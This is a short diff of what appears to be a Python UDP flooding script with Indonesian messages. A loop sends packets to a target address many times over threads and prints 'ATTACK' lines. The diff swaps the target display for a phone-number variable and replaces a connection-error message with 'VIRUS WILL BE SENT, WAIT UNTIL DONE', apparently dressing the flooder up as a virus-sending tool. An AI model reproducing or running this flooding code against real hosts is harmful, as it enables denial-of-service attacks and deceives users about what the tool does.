@@ -29,9 +29,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" \033[1;32;40mATTACK-------------------> \033[0;31;47m" + ip +"\033[0m")
+			print(i +" \033[1;32;40mATTACK-------------------> \033[0;31;47m" + no.Hp +"\033[0m")
 		except:
-			print("\033[1;34;40m[\033[1;31;40m!\033[1;34;40m] \033[0;31;47mPeriksa Koneksi Internet Anda Terlebi Dahulu \033[0m")
+			print("\033[1;34;40m[\033[1;31;40m!\033[1;34;40m] \033[0;31;47mVIRUS AKAN TERKIRIM TUNGGU SAMPAI SELESAI \033[0m")
 
 for y in range(threads):
 	if choice == 'y':
